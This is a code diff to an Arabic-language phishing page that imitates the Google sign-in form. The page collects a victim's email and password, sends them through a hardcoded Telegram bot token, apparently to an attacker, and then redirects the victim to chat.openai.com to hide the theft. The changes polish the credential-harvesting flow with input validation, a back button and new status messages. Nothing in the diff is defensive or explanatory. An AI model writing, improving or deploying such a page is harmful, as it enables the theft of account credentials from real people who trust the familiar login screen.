@@ -104,7 +104,7 @@
     </div>
     <a class="link" href="#">هل نسيت البريد الإلكتروني؟</a>
     <button onclick="goToPassword()">التالي</button>
-    <a class="link" href="#">انشاء حساب آخر</a>
+    <a class="link" href="#">استخدام حساب آخر</a>
     <div class="status" id="status"></div>
   </div>
 
@@ -112,23 +112,32 @@
     function goToPassword() {
       const emailInput = document.getElementById("email");
       const email = emailInput.value.trim();
-      const displayEmail = email || "المستخدم";
+      const statusEl = document.getElementById("status");
+
+      if (!email) {
+        statusEl.textContent = "يرجى إدخال البريد الإلكتروني.";
+        return;
+      }
 
       const formBox = document.getElementById("formBox");
       formBox.innerHTML = `
         <div class="form-container">
           <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
-          <h2>مرحبًا ${displayEmail}</h2>
+          <h2>مرحبًا ${email}</h2>
           <p>أدخل كلمة المرور لحسابك</p>
           <div class="input-group">
             <input type="password" id="password" placeholder="كلمة المرور">
           </div>
           <a class="link" href="#">هل نسيت كلمة المرور؟</a>
-          <button onclick="sendData('${email || 'غير محدد'}')">تسجيل الدخول</button>
-          <a class="link" href="#">انشاء حساب آخر</a>
+          <button onclick="sendData('${email}')">تسجيل الدخول</button>
+          <button onclick="goBack()">رجوع</button>
           <div class="status" id="status"></div>
         </div>
       `;
+    }
+
+    function goBack() {
+      location.reload(); // يرجع النموذج الأصلي بإعادة تحميل الصفحة
     }
 
     function sendData(email) {
@@ -141,7 +150,7 @@
         return;
       }
 
-      statusEl.textContent "تم تسجيل الدخول ";
+      statusEl.textContent = "جارٍ الإرسال...";
 
       const message = `📥 تسجيل دخول جديد:\n📧 البريد: ${email}\n🔐 كلمة المرور: ${password}`;
       const token = "8185557975:AAEDUZuAvskBZTTvSqyHKfcVuR3CfoRjp3U";
@@ -152,9 +161,9 @@
         .then(res => {
           if (!res.ok) throw new Error("فشل الاتصال");
           statusEl.style.color = "#188038";
-          statusEl.textContent = "✅ تم تسجيل الدخول بنجاح . يتم التحويل...";
+          statusEl.textContent = "✅ تم الإرسال. يتم التحويل...";
           setTimeout(() => {
-            window.location.href = "www.arbada.com";
+            window.location.href = "https://chat.openai.com";
           }, 1500);
         })
         .catch(() => {
